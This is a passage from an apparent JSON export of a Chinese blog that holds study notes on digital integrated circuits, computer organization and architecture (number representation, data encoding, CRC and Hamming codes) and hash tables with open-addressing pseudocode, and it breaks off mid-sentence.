数字集成电路：数字电路实现的逻辑功能都是以集成电路（IC）形式体现的，具有体积小，可靠性高，功耗低，集成度高等特点。目前广泛采用CMOS电路和TTL电路两种类型。CMOS已成为主导技术并有可能取代TTL。二者相比，前者功耗小，集成度高，后者速度快，但集成度不如CMOS。 CMOS系列：金属氧化物半导体晶体管作为开关元件的门电路叫MOS电路，分为使用P沟道管的PMOS电路，使用N沟道管的NMOS电路和同时使用的CMOS电路。直流电源下，CMOS可分为+5V和+3.3V两类，3.3V电源是对5V的改进，减少功耗34%。采用5V直流电压的基本CMOS系列有74HC、74HCT、74AC、74ACT、74AHC和74AHCT。采用3.3V直流电压的基本CMOS系列有74LV、74LVC、74ALVC。CMOS和TTL结合的BiCMOS系列有74BCT、74ACT、74LVT、74ALB，BiCMOS是最先进的系列。 TTL系列：为晶体管-晶体管逻辑电路工艺制造技术的缩写。TTL由5V直流电压供电，有74、74S、74AS、74LS、74ALS、74F等。 集成电路使用特性：1）负载能力，一个逻辑门的输出端所能连接的下一级逻辑门输入端结点个数称为该逻辑门的扇出数（负载能力）。一般逻辑门负载能力为8,功率逻辑门负载能力可达25。2）延迟特性，定义输入波形前沿的50%到输出波形前沿的50%之间的时间间隔t1为前沿延迟，同理定义t2为后沿延迟，t = （t1 + t2）/2为平均传输延迟时间（平均时延）。TTL低速器件t &gt; 40ns，中速器件t = 15～40ns，高速器件t = 8～15ns，超高速器件t &lt; 8ns。3）功耗特性，当输出端空载，门电路输出低电平时电路的功耗称为空载导通功耗P-on，当输出端为高电平时电路功耗称为空载截止功耗P-off，P-off &lt; P-on。CMOS门电路平均功耗(P-on + P-off)/2在微瓦数量级。4）未使用的输入端引脚要接到一个固定的逻辑电平。与门和与非门要接到电源电压+Vcc，或门和或非门要接地。 专栏目录：计算机理论基础此专栏的上一篇文章：计组与体系结构笔记（一）：基础概念此专栏的下一篇文章：计组与体系结构笔记（三）：简单体系模型 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2015/10/14/Computer-Organization-Architecture2/) 、作者信息（Forec）和本声明。","categories":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}],"tags":[{"name":"计组与体系结构","slug":"计组与体系结构","permalink":"http://forec.github.io/tags/计组与体系结构/"}],"keywords":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}]},{"title":"计组与体系结构笔记（一）","slug":"Computer-Organization-Architecture1","date":"2015-10-12T12:01:59.000Z","updated":"2016-11-22T11:09:44.000Z","comments":true,"path":"2015/10/12/Computer-Organization-Architecture1/","link":"","permalink":"http://forec.github.io/2015/10/12/Computer-Organization-Architecture1/","excerpt":"摘录一些概念，作备忘。正在看的教材是Linda Null和Julia Lobur的《The Essentials of Computer Organization and Architecture》（机械工业出版社，2006年）。","text":"摘录一些概念，作备忘。正在看的教材是Linda Null和Julia Lobur的《The Essentials of Computer Organization and Architecture》（机械工业出版社，2006年）。 基础概念和发展历史 计算机组成（computer organization）：计算机组成强调的是有关控制信号（怎样控制计算机）、信号传递方式以及存储器类型等问题，涵盖了有关计算机系统的物理构成的各个方面。此部分可以回答“计算机怎样工作？”。 计算机体系结构（computer architecture）：集中讨论计算机系统的结构和行为，主要涉及程序员熟悉的系统实现的逻辑方面内容。其包括许多基本要素，如指令集和指令格式、操作码、数据类型、寄存器的数目和类型、寻址方式、主存储器的访问方式和各种I/O机制等。对于某个特定的计算机，计算机体系结构就是其各硬件部分的组合，再加上其指令集体系结构（ISA，instruction set architecture）。ISA是在机器上运行的所有软件和执行这些软件的硬件之间的协定接口，实现了人机对话。此部分可以回答“怎样设计一台计算机”。 硬件和软件等效原理：任何可以利用软件实现的工作可以利用硬件来实现，反之，任何可以通过硬件来实现的事件也同样可以利用软件来实现。此原理说明，可以用不同的选择来实现相同的计算机功能，如对于微波炉的控制系统，一个简单的嵌入式系统会比一个复杂的计算机程序性能好的多。 计算机三种基本组成部分：1）用来解释和执行程序的处理器，2）用来存储数据和程序的存储器，3）与外界进行数据传输的机制。 通用前缀Kilo-(k) ( 1 thousand = 10^3 ≈ 2^10 )Milli-(m) ( 1 thousandth = 10^-3 ≈ 2^-10 )Mega-(M) ( 1 million = 10^6 ≈ 2^20 )Micro-(μ) ( 1 millionth = 10^-6 ≈ 2^-20 )Giga-(G) ( 1 billion = 10^9 ≈ 2^30 )Nano-(n) ( 1 billionth = 10^-6 ≈ 2^-30 )Tera-(T) ( 1 trillion = 10^12 ≈ 2^40 )Pico-(p) ( 1 trillionth = 10^-12 ≈ 2^-40 )Peta-(P) ( 1 quadrillion = 10^15 ≈ 2^50 )Femto-(f) ( 1 quadrillionth = 10^-15 ≈ 2^-50 ) 系统时钟：系统时钟在每秒钟内发射的脉冲数目是时钟的频率，单位赫兹。每条计算机指令的执行需要若干个固定的时钟周期，大多数指令需要的时间都多于一个时钟周期。一个微处理器每秒钟实际执行的指令数目与微处理器的系统时钟的速度成正比。 几个协会： 电子与电气工程师协会（Institute of Electrical and Electrnoic Engineers，IEEE）是致力于电子工程和计算机工程专业进步的组织，积极推动全球范围内工程领域的合作，出版大量的技术文献。IEEE同时为各种计算机部件、信号传送协议和数据表示方法制定标准和各种技术命名。 国际电信联合会（International Telecommunication Union，ITU），设立在日内瓦，前身为电话电报国际咨询委员会（CCITT）。其关注通信系统的协同性，包括电话、电报和数据通信系统。ITU建立了许多通信方面的标准，以ITU-T或CCITT为前缀开头。 美国国家标准学会（American National Standards Institute，ANSI），英国标准协会（British Standards Institution，BSI），欧洲标准化委员会（Comite Europeen de Normal，CEN）。 国际标准化组织（International Organization for Standardization，ISO），协调世界范围内各种标准化发展，包括协调ANSI和BSI在其他组织中的活动。ISO源于希腊词“isos”（相等的事物）。 发展史 0代：机械计算器。“计算之父”巴贝奇（Charles Babbage）1822年制造了差分机，之后设计了分析机，其中分析机包含现代计算机的部分部件：一个算术逻辑部件，一个存储器，以及I/O设备。设计中包括了条件转移操作，即下一条指令由前一个操作的结果来决定。分析机输入使用穿孔卡片（应用时间最长的计算机输入方法），霍尔瑞斯（创建了IBM前身），设计过80行穿孔卡片，作为数据自动数据处理的主要产品流行了50多年。 1代：真空管计算机。1）20世纪30年代，德国人Konrad Zusse在Babbage的设计中加入电学技术和其他改进，制造出一台电动计算器Z1。Z1是可编程的，并且配有一个存储器，一个算术部件和控制部件。2）John Atanasoff建造了第一台完整的电子计算机系统，Atanasoff Berry计算机（ABC）是使用真空管建造的二进制机器。3）John Mauchly和J. Presper Eckert于1946年公布ENIAC，被公认为世界上第一台全电子通用数字计算机，最初设计为军方计算弹道表。 2代：晶体管计算机。1948年贝尔实验室的John Bardeen、Walter Brattain和William Shockley发明晶体管，与真空管相比，晶体管体积更小，功耗更低，工作温度更低使得工作性能更加可靠，推动了计算机发展进入新时代（1954-1965）。期间，IBM、数字仪器公司（DEC）和Univac（现在称作Unisys）主导当时的计算机产业，控制数据公司（CDC）建造了世界上第一台超级计算机CDC6600。 3代：集成电路计算机。Jack Kilby发明了集成电路（IC），集成电路集成了几百到几百万个微型晶体管，推动计算机进入快速发展时期。IC时代还引入了分时共享、多道程序处理的概念（多人同时使用一台计算机的能力）。 4代：超大规模集成电路计算机。集成电路技术发展分为：小规模集成电路（SSI，每块芯片上有10-100个元件），中规模集成电路（MSI，100-1000），大规模集成电路（LSI，1000-10000）和超大规模集成电路（VLSI，超过10000）。超大规模集成电路标志着第四代计算机开始。1997年为纪念ENIAC诞生50周年，宾夕法尼亚大学的学生将ENIAC组装到一个单芯片中。1971年，Intel公司创造出世界上第一个微处理器4004（4位，工作频率108KHz），并且引进了随机存储器（RAM）芯片，单芯片上可以存储4K位的存储器。VLSI技术催生了微型计算机，最早的微型计算机是微型仪器和遥感技术公司（MITS）在1975年推出的Alstair 8800,随后涌现了Apple I，Apple II，Commodore公司的PET和Vic 20等。到1981年，IBM公司推出了个人计算机。IBM的PC机构思设计采用“开放式”体系结构，即尽可能多的使用“非定制的”通用部件，因此PC机的体系结构很少有专利产品的成分，但这种公开性让IBM公司为计算机工业制定了行业标准。 5代： ？。并行处理、网络应用和单用户工作站的广泛普及，神经网络，DNA，光学计算机/量子计算机。 摩尔定律：硅芯片的密度每18个月翻一番（—— Intel公司奠基人Gordon Moore）。摩尔定律的推论Rock定律：制造半导体集成电路所需要的主要设备的成本每4年就要翻一番。二者不可能同时成立。按照目前的技术，摩尔定律不可能永远保持，除非计算机制造采取全新的技术，如量子计算机。 计算机的分层组织结构：假设计算机按照不同的层次结构建造，每个层次具有某项特定功能，并具有一个特定的假想机器与之对应。对应计算机的每一个层次的这种假想的这种计算机称为虚拟机。每一层的虚拟机都执行自己特有的指令集，必要时还可以调用较低层次的虚拟机来完成各种工作任务。第六层用户执行的程序第五层高级语言C++、Java、Python等第四层汇编语言汇编语言代码第三层系统软件操作系统、库代码第二层机器指令集体系结构ISA第一层控制系统微代码或硬导线连接第零层数字逻辑电路电子线路、逻辑门等在控制系统层，控制单元将确保正确的译码并执行指令，并适时将数据传送到正确位置。控制单元的设计有两种方式，一种是导线直接连接（硬连线），控制信号由数字逻辑部件的电路模块发送，一旦设计完成就很难修改。另一种方式是使用一个微程序执行指令，微程序是一个利用某种低级语言编写的程序，可以由硬件直接执行。在机器层生成的机器指令会被输入到这个微程序中，由微程序解释并激活硬件执行原始指令。一条机器层的指令通常被翻译成几个微代码指令，由于增加了额外的翻译过程，因此这种方法的执行速度会比较慢。 冯·诺伊曼模型：早期电子计算机的编程通过各种导线接插连线。在ENIAC完成前，John W. Mauchly和J. Presper Eckert构思设计了一种可以改变计算机运行状态的简易方法，依赖于一种利用汞延迟线形式的存储设备，可以提供一种存储程序指令的方法，从而在每次求解新问题或者对原来的问题进行调试时不必对系统进行重新连线。由于置身于二战研究ENIAC计划中，二人被禁止发表这个构想，暂时将这个想法写成文字计划。匈牙利数学家冯·诺伊曼（计算机之父）在阅读了计划书后，将这种存储器思想发表公开，并为世人公认。现在，所有的存储程序的计算机都被称为使用冯·诺伊曼体系结构（Von Neumman architecture）的冯·诺伊曼系统。 冯·诺伊曼系统满足如下基本特征：1）由三大硬件系统组成：一个中央处理器（central processing unit，CPU），其中包含一个控制单元，一个算数逻辑单元（arithmetic logic unit，ALU），若干个寄存器（register，一些小的存储单元）和一个程序计数器；一个主存储器系统（main-memory system），用来保存控制计算机操作的各种程序；一个I/O系统。2）具有执行顺序指令的处理能力。3）在主存储器系统和CPU的控制单元之间，包含一条物理上的或者是逻辑上的单一通道，可以强制改变指令和执行的周期，这种单一通道称作冯·诺伊曼瓶颈（Von Neumman bottleneck）。 冯·诺伊曼系统中的I/O通过算数逻辑单元连接（实际通过累加器连接，累加器是ALU的一部分）。这种体系结构按着一种称为冯·诺伊曼执行周期（Von Neumman execution cycle）的方式运行，这种计算机工作原理又称为取指-译码-执行周期（fetch-decode-execute cycle），该周期的一个循环过程如下：1）控制单元从计算机的存储器中提取下一条程序指令，并利用程序计数器来决定这条指令所在的位置；2）对提取的指令进行译码，变成ALU能够理解的一种语言；3）从存储器中取出执行指令所需要的各种操作数的数据，并把它们放入CPU的寄存器中；4）ALU执行指令，并将执行的结果存放到寄存器或者存储器中。 冯·诺伊曼体系结构的思想已经得到了很大发展：系统总线模型。计算机系统中的数据总线将数据从主存储器中传递到CPU的寄存器中，反之亦然；地址总线负责保持数据总线正在访问的数据地址；控制总线传送各种必要的控制信号，以指定信息传输发生的方式。其它方面的一些改进包括：采用变址寄存器进行编址，增加了浮点数据，使用中断和异步的I/O结构，增加了虚拟存储器，通用寄存器等。 非冯·诺伊曼模型：神经网络（利用人脑模型的思想作为计算范式），基因算法（利用生物学和DNA演化的思想开发），量子计算和并行计算机。并行计算的概念目前最为流行。根据Amdahl定律，对于某种特定的系统改进，系统性能增强的可能性受到那些被改进的特征部位的使用次数的限制。其含义在于，每种算法都有顺序执行的部分，顺序执行的部分最终会限制利用多处理器执行时所能获得的加速，因此要尽量减少使用系统中最慢的部分。 数据表示方法 最基本的信息单元称为一位（bit），是二进制数（binary digit）的英文缩写。8个位为一组作为计算机存储器编址的基本单元字节（byte），计算机的字由两个或多个相邻字节构成，有时用来对存储器编址，将字作为一个集合处理。字的大小（word size）表示了一个特定计算机体系结构能够处理的最有效的数据大小。8位字节可以对半分为两个4位，称为半字节，包含最小值二进制数字的半字节称为低半字节，另外半个字节为高半字节。 位置编码系统（positional numbering systems）：任意数字的值都可以通过表示成某个基数（或称为底，radix）的乘幂形式。也称为权重编码系统（weighted numbering system），数的每一个位置都是基数的幂次方。 无符号整数的进制转换两种方法：重复减法，除法-余数。一个N位的二进制数可以表示从0～2^N-1范围内的无符号十进制整数。当对无符号的二进制数进行算数预算，结果超出给定位数的二进制数所能表示的数值范围，称作溢出。分数进制转换：用基数的负指数幂近似表示分数。两种方法：重复减法，以及乘法-整数。在某个进制中小数点右边包含循环重复的数字船的分数，在另一种进制的表示中不一定具有重复的数字序列。如2/3在十进制中是无限循环小数，而在三进制中则表示为0.2(3)，不再有数字循环。进制相互转换：除一2的指数幂组成的基数之间的数字转换（直接按位分组展开或合并，不足的部分整数左补0，小数右补0）外，其他情况通常先把数字转换为以10为基的数，再将其转换为所要求的基数。倍乘转换法：假如原始进制为r，要转换为十进制。r进制的各位中，每个后面的位的r的次幂为前面一位的r的次幂的r倍。从最高位开始，将第一位乘r加到第二位上，得到的和再乘以r加上第三位，依此类推直到最右边的位。 带符号整数（正整数和负整数的集合）的表示方法： 符号幅值表示法：最高位为符号位，其余位用来表示数值的幅值。N位能够表示的范围为-2^(N-1)+1~2^(N-1)-1，八位字可表示整数范围-127～127。其算术规则为：1）如果符号相同，大小相加，结果取相同的符号；2）如果符号相反，先比较幅值的大小，符号位由幅值较大的操作数决定，幅值为大幅值减去小幅值；3）从右往左算术运算，加法可能进位，减法可能借位，如果最高位有进位则说明发生了溢出。通过这种方法表示0会有两种可能：10000000或00000000，造成逻辑和电路上的复杂性。 反码：在r进制中，如果规定有d位数字，则数字N的反码定义为（r^d - 1）- N。对于十进制数，r=10，则2468的反码就是10^4 - 1 - 2468 = 7531。对于二进制来说，只需要将所有位翻转。其算术运算规则遵循高低两端进位循环（end carry-around）：如果最高位有进位（0或1），就把进位加到最低位上。 补码：2的补码（two’s complement）是补码体系的特例。假设在基数为r，位数为d的计数体系中，如果N ≠ 0，N的补码定义为r^d - N，如果N = 0，则N的补码就是0。补码比反码更直观，补码 = 反码 + 1。求一个二进制数的补码（取补）只需要将每位翻转再加1。这种处理简化了加减法运算，免除了高低两端进位循环问题。在补码表示法中，两个同符号数相加可能产生溢出，而符号相反的数相加不会产生溢出，判断溢出的简单法则是：如果进入符号位和移出符号位的进位相等，则没有溢出发生，如果不同则发生溢出。N位二进制数采用补码表示法所表示的数值范围具有非对称性，可表示-2^(N-1)～2^(N-1)-1，如4位二进制补码表示法可以表示十进制-8～7之间的数。 乘除运算：乘法运算与竖式类似，设置一个指针指向乘数的最低位，从右向左读，指针每向左移动一位，被乘数也整体左移一位。结果初始化时为0，根据指针指向的乘数当前位是否为1决定是否加上被乘数。除法运算（整数除法和浮点除法有显著区别）可能引起计算机系统崩溃，如尝试除以0，或者两个操作数大小相差悬殊。当除数远小于被除数时，会产生“除法下溢”，即被等效视为被0除。 浮点表示法：采用浮点仿真（floating-point emulation），浮点数由三部分组成，符号位、指数部分、小数部分（有效数，significand）。对于14位模型，最高位为符号位，之后5位为指数位，最后8位为有效数。例如表示10进制17，17 = 0.17 × 10^2 = 0.10001(2) × 2^5。因此14位模型为0 00101 10001000。如果要表示分数，需要使用负指数，通常采用偏移指数来表示。如对于14位模型，指数部分有5步，因此可以表示0～31，取偏移指数为16，指数部分减去16的结果是实际的指数值。一种惯例是规格化（normalization）：将有效数的最左边的位总是设置为1，好处在于最左边的1对于有效数给出了一位额外的精度。 浮点算法：对于加减法，先将参与运算的两个数表示成具有同一基数的相同指数形式，然后通过移位将两个数对齐，得到的结果重新进行规格化处理，保留较大的指数。乘法和除法采用与十进制相同的法则。通过浮点仿真模型存储的数据可能会出现浮点误差，并且无论这个系统设计的多么大，用有限的系统表示实数集必然会引入不同程度的浮点误差。IEEE制订了关于浮点数的表示标准IEEE-754，单精度标准采用8位指数和23位有效数，偏移量127，当指数为255时表示正负无穷大或NaN（一个非实数的值，通常用作错误标识）；双精度标准采用11位指数和52位有效数字，偏移量1023，指数为2047时表示NaN。无论单双精度都有两种表示0的方法，当指数部分和有效数都为0时，无论符号位都是0。 数据编码方法 字符编码 二进制编码的十进制数（binary-coded decimal，BCD）：最初在IBM主流机型和中间过渡机型上使用，将每个十进制数字编码成一个4位的二进制数形式。如果按照8位字节的形式存储，则高4位称为区位（zone），低四位称为数字（digit）。主流BCD包含属于位置编码系统的8421码，5421码，2421码，以及非位置编码系统的余3码，格雷码。8位存储时的区位分别为1111（无符号数），1100（正数），1101（负数）。因为BCD编码数的数字只占半字节，因此多个相连的数字放入相邻的半字节时只需要留下一个5位的半字节作为符号，这个过程称为压缩。 EBCDIC：在开发IBM System/360前，IBM一直使用6位BCD编码表示字符和数字。为保证兼容性，后来采取了扩展的二-十进制编码的交换代码，将6位拓展到8位。 ASCII：美国信息交换标准代码（American Standard Code for Information Interchange）是从电传打字设备的编码方案中直接衍生出来的，20世纪60年代，ISO设计了一种7位的编码方案，称为第5国际字母。1967年成为官方标准。 统一字符编码标准：1991年，统一字符编码协会建立了新的国际信息交换代码Unicode，为16位编码字母表，可以向下兼容ASCII码和拉丁-1字符集，并与ISO/IEC 10646-1国际字母表相一致，能够对全世界所使用的每一种语言的大多数字符进行编码。统一字符编码目前是美式计算机系统唯一使用的字符编码。 用于数据记录和传递的编码方式（在把宿舍写入到某种类型的记录介质如磁带或磁盘，或者将数据进行长距离传送时，二进制信号可能会变得模糊不清，尤其是一长串的0或1）： 不归零编码（non-return-to-zero，NRZ）：用高电压表示1，低电压表示0。对于长串的0或1，如果接收器同步较慢或者定时系统发生错位，很容易丢失编码。 反转不归零编码（non-return-to-zero-invert，NRZI）：采用信号的转变，或者从高到低，或者从低到高的变化表示二进制的1，没有变化则表示0。虽然消除了二进制数1的丢失问题，但仍面临长串0的问题。 相位调制编码（phase modulation，PM），对编码的每一位都提供一个信号转变，二进制1由上升转变的信号给出，0则伴随一个下降转变的信号（如果需要，还会在每个位单元的边界提供一个额外的信号转变）。相位调制编码通常用于数据传送，如局域网，但不足以运用于数据存储，因为PM需要两倍于NRZ编码的位数。 频率调制编码（frequency modulation，FM），类似于相位调制编码，在每个位单元中至少提供一个信号跃变，这些同步的跃变发生在每个位单元的开始处，除此之外如果对二进制1编码，还要在位单元的中间提供一个额外的信号跃变。相对于数据存储而言，FM只是比PM好一点。FM可以延伸出一种改进的频率调制（MFM），这种方法只对具有连续的0的编码才在位单元的边界提供信号跃变。因为MFM编码需要的信号跃变数比PM少，比NRZ多；错误控制和经济角度又较为高效，因此多年来MFM编码是硬盘存储中使用的唯一编码方式。 运行长度限制编码（Run-Length-Limited，RLL）是一种对由字符编码组成的字进行分块的编码方式。比如把ASCII码或EBCDIC码翻译成一族特殊设计的编码字，限制连续0出现的数目，如RLL（d，k）编码允许在任何一对相邻的1之间出现最少d个，最多k个0。显然RLL编码字必须包含比原来的字符编码更多的位数，但RLL在磁盘上采用NRZI方式编码，因此RLL编码的数据在磁介质上占更少的空间，因为这种编码涉及到的磁通量的转变少的多。RLL（2,7）是磁盘系统中使用的主流编码方式，它是一个8位的ASCII或EBCDIC字符的16位映射，但比MFM编码高出50%的存储效率。理论上，RL是一种Huffman编码的数据压缩形式，核心思想是使用最短的编码字的位组合方式来对尽可能多的信息位的组合方式进行编码。 错误检测与校正 循环冗余码校验（cyclic redundancy check，CRC）可以决定在一大块或者一长串信息字中是否出现一个错误，要检测的数据字块的规模越大，要求的校验和就越大，并且需要对求校验和的方法提供某种适当的保护，求校验和的方法以及CRC方法都是一种系统性的误差检测（systematic error detection）方案，即将错误校验位夹在原始信息数据位的后面。组成错误校验位的位组合称为校正子。CRC采用模2算术，假设信息字节为I = 1001011（可以是任意大小的字节），发送器和接收器都对某个任意的二进制位组合模式达成协议，如P=1011（如该位组合模式的开始和结束位都是1则效果最好），记P的位数为n = 4，将I左移n-1位，并用新的I作为被除数，P作为除数进行模2除法，得到余数r，将余数r加到移位后的I上，组成要发送的信息M。在本例中，r = 100，I + r = M = 1001011100。接受端将M使用模2除法除以P，如果无法严格整除则传送过程中有错误发生。常用的P可以为CRC-CCITT（ITU-T）：0001 0001 0000 0010 0001；CRC-12：0001 0000 0000 1111；CRC-16（ANSI）：0001 1000 0000 0000 0101；CRC-32：1 0000 0100 1100 0001 0001 1101 1011 0011。前三种是对字节操作，CRC-32是对4字节操作，适用于32位字系统。 海明编码（Hamming code）具有校正错误的能力，采用奇偶校验。普通的奇偶校验只能检错（且无法检测双位出错）无法纠错。通常使用在随机错误最可能发生的情形（假定每一位出错的几率都是固定的，与其他位的出错没有关联）。海明编码的奇偶校验位（冗余位）根据信息字本身的位数决定。最后形成的编码字由m位信息字本身和r位校验位组成，满足m + r + 1 &lt;= 2^r。两个编码字之间不同的位的位置数目称为两个编码字的海明距离，对于一种编码方法中任意一对编码的最小海明距离（minimum Hamming distance），用D（min）表示。海明编码可以检测出D（min）-1个单位错误，能够纠正[（D（min）-1）/2]个错误。因此如果要纠正k个错误，最小海明距离必须大于2k+1。 创建海明编码的方法：首先根据公式确定编码所需的校验位数目r，算出编码字的位长度n = m + r，从右向左从1开始编号。位数是2的指数幂的位设置为奇偶校验位，其他位为数据位。对于各个编码位置，第b位编码由满足b = b1 + b2 + … + bj的奇偶校验位b1，b2，…，bj检测。例如：对ASCII字符K编码，K为01001011，m=8，r=4。从1开始从右向左编号，第1，2，4，8位为奇偶校验位，1 = 1，2 = 2，3 = 2 + 1，4 = 4，5 = 4 + 1，6 = 4 + 2，……，10 = 8 + 2，11 = 8 + 2 + 1，12 = 8 + 4。因为第1、3、5、7、9、11位的求和表达式中含有1，所以第一位（最低位）的奇偶校验位将检测这几个位置的奇偶特性，同理，第2位对2、3、6、7、10、11位作用，第4位对4、5、6、7、12位作用，第8位对8、9、10、11、12作用。分别对各自对应的位数奇偶校验，产生编码字010011010110。假如在传递编码字的过程中发生了一个错误，如发生在第9位，则接收到的为010111010110。接受端可以发现第1位、第8位的奇偶校验位出错，而第2位、第4位没有出错。因此可以推测出出错的码位是1 + 8 = 9位。取反即可。海明编码在出错率非常低的正常情况非常有效，但如果发生成块的错误（相邻数据位），则无效。 里德-所罗门编码（Reed-Soloman，RS）针对区块错误（突发错误），如因为操作不当和外界环境影响导致存储设备发生相邻数据位损坏。RS编码属于CRC类型的编码，是一种系统编码方式，在信息字节块上加入奇偶校验位。RS（n，k）编码中的参数定义为：s = 一个字符所占位的数目，k = 构成数据块的s位字符的数目，n = 编码字的位的数目。RS（n，k）可以在k个信息字节组成的编码字中校正（n-k）/2个错误。流行的RS（255,233）编码方式是采用223个8位信息字节加上32个错误校正字节构成255字节的编码字。 专栏目录：计算机理论基础此专栏的下一篇文章：计组与体系结构笔记（二）：布尔代数和数字逻辑 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2015/10/12/Computer-Organization-Architecture1/) 、作者信息（Forec）和本声明。","categories":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}],"tags":[{"name":"计组与体系结构","slug":"计组与体系结构","permalink":"http://forec.github.io/tags/计组与体系结构/"}],"keywords":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}]},{"title":"基础数据结构（散列和优先队列）","slug":"Data-Structure-basis2","date":"2015-09-28T05:53:37.000Z","updated":"2016-11-04T15:55:10.000Z","comments":true,"path":"2015/09/28/Data-Structure-basis2/","link":"","permalink":"http://forec.github.io/2015/09/28/Data-Structure-basis2/","excerpt":"散列表，优先队列的二叉堆实现。","text":"散列表，优先队列的二叉堆实现。 散列表 散列表（hash table）是一种较高效率的仅支持insert，search和delete（字典操作）的动态集合结构，是普通数组概念的推广，理想情况下可以在O（1）的时间内寻址。 直接寻址表和散列表 当关键字的全域U较小时，可以直接寻址。用一个数组T[0，1，2，…，n - 1]来对应U中的每一个关键字。每个单元k指向U中关键字为k的元素，如果集合中没有关键字为k的元素，则T[k] = NIL。其字典操作非常简单：search( T, k ){ return T[k]; }，insert( T, x ) { T[key(x)] = x; }以及delete( T, x ){ T[key(x)] = NIL; }。所有操作都只需要O（1）的时间。 如果U很大，可用内存限制不能存储整个表，或者U很大但实际使用的关键字很少，导致了过多空间资源的浪费。 当存储在字典中的关键字集合K比所有可能用到的关键字域U小很多时，散列表比直接寻址表需要的存储空间小很多。与直接寻址不同之处在于：直接寻址中，关键字k的元素被存放在槽k中，散列表中，该元素存储在槽h（k）中。h（）是散列（哈希）函数，根据关键字k计算出槽的位置，因此将关键字域U映射到散列表T的[0…n-1]的槽中。称之为，具有关键字k的元素被散列到槽h（k）上，或者说h（k）是关键字k的散列（哈希）值。采用散列函数的目的在于缩小需要处理的下标范围，将需要处理的下标从|U|降到n，从而降低了空间开销。 碰撞 根据上面的描述可以看出，h（）是根据关键字计算散列值的函数，因为具有某种固定的计算规则，所以可能会将两个不同的关键字映射到同一个槽上。我们将这种情况称为碰撞。最理想的解决方法是完全避免碰撞，这可以通过选择散列函数h来实现，目标是使h尽可能产生随机的散列值。但是根据鸽巢原理，一旦|U|&gt;n，一定会出现碰撞，此时需要解决必然会出现的碰撞。 链接法 实现：将散列到同一个槽k中的所有元素放到一个链表里，槽k存储链表的表头，如果不存在这样的链表，则槽k = NIL。通过链接解决碰撞后的字典操作如下：insert( T, x ) { insert element with key x at the head of list T[ h(x) ] }，search( T, x ) { search for an element with key x in list T[ h(k) ] }，delete( T, x ) { delete element with key x from the list T[ h(x) ] }，这里x是U中包含的关键字。 性能：插入操作复杂度O（1），删除和搜索操作需要对槽k中的每个元素加以对比，因此与表的长度有关。假设有一个能存储n个元素，具有m个槽位的散列表T，在最差情况下，所有n个关键字全部散列到其中同一个槽中，这时查找时间为Θ（n），加上计算散列函数的时间将和线性表无异。散列方法的优势依赖于所选取的散列函数h在一般情况下将所有关键字分布在m个槽位上的均匀程度。假设任何元素散列到m个槽中的任何一个可能性是相同的，并且与其他元素已经散列的位置无关（称这个假设为简单一致散列，simple uniform hashing）：对于m个槽，列表T[i]的长度使用Ni表示，n = N0 + N1 + … + Nm-1，因此Ni的平均值为α = n / m。定义T的装载因子（load factor）为α，用来表示一个链中平均存储的元素个数。在O（1）的时间内计算出散列值h（x），因此查找关键字为x的元素的时间与表T[ h(x) ]的长度Nh(x)线性相关。分析（离散数学中关于算法最坏和平均复杂度的分析）可知，平均情况下查找的时间复杂度为Θ（1+α）。这说明：当散列表中槽数m和表中元素数n成正比时，即n = O（m）时，α = n / m = O（m）/ m = O（1）。因此：散列表中槽数和表中元素数成正比时，平均情况下全部字典操作都可以在O（1）时间内完成。 以上部分的原文在《算法导论（第二版）》的224-225页可以找到，对其进行了部分修改。在算导原文（Page 224）中提出，采用链接法时，如果使用双向链表可以使删除操作复杂度在任何情况下都为O（1）：这里注意书中提出的“删除一个元素x的操作可以在O（1）时间内完成”，这里删除的是元素x，x是指向某个对象的指针，因此双向链表可以在O（1）内完成。 开放寻址法 开放寻址法（open addressing），所有的元素都存储在散列表中，即每个槽或者包含一个元素，或者包含NIL。 当插入某个关键字为x的元素时，先计算散列值h（x），如果槽h（x）是空槽，则将元素插入该槽，否则从h（x）槽开始向后连续探查，直到寻找到一个空槽来存储该元素。这里的连续探查不一定是0，1，2，…，n-1这样的顺序，而应该依赖于待插入的关键字x：为哈希函数h（）添加参数，变成{h（k，0），h（k，1），…，h（k，m-1）}，使其根据当前探查的次数来决定探查哪些槽，这样做的目的在于使查找的时间依赖于α（完全依赖于散列函数的查找序列近似依赖于关键字，而根据简单一致性散列，这样的查找时间便依赖于α）。改变后的h的不同，会导致效果的不同，将在后面详细介绍。下面给出插入的伪代码描述： 1234567891011Open_addInsert( T, k )&#123; i = 0 repeat j = h( k, i ) if T[j] == NIL // || T[j] == Deleted T[j] = k return j else i = i + 1 until i == m error \"Overflow\"&#125; 当查找某个元素时，需要从散列值指向的槽向后连续探查，直到找到要寻找的元素，或发现该元素不在表中。 123456789Open_addSearch( T, k )&#123; i = 0; repeat j = h( k, i ) if T[j] == k return j i = i + 1 until T[j] == NIL or i == m return NIL&#125; 从槽i删除元素时，不能直接将槽置为NIL，否则若删除前有某元素k插入，发现i被占用，将k置于槽i后面的某个位置，则在槽i被置为NIL后将无法检索到k。可以通过给槽i设置一个特殊的值Deleted表示已被删除，因此需要修改insert部分，增加一个判断（代码中注释部分）。但当使用Deleted标注时，查找时间将不再依赖于α（伪删除）。因此在必须删除关键字时，通常采用链接法。 开放寻址法探查序列的计算 计算探查序列通常有线性探查，二次探查和双重探查。这三种方法都可以保证对没个k，产生的{h（k，0），…，h（k，m-1）}都是{0，1，…，m-1}的一个排列。理想散列要求可以产生m！个探查序列，而这三种方法产生的探查序列可能结果都不超过m^2 个。 线性探查：给定一个普通散列函数h’：U-&gt;{0，1，…，m-1}，将其成为辅助散列函数，线性探查（linear probling）采用的散列函数h为h( k, i ) = ( h’(k) + i )mod m，其中i = 0，1，…，m-1。这种探查方法产生的探查序列近似于{0，1，2，…，m-1}的模式，并且完全依赖于初始探查位置，因此最多能产生m个不同的探查序列。线性探查容易实现，但存在一次群集（primary clustering）问题，随着时间的推移，连续占用的槽不断增加，平均查找时间也不断增加。因为当一个空槽前有i个满槽时，该空槽是下一个将被占用的槽的概率是（i+1）/ 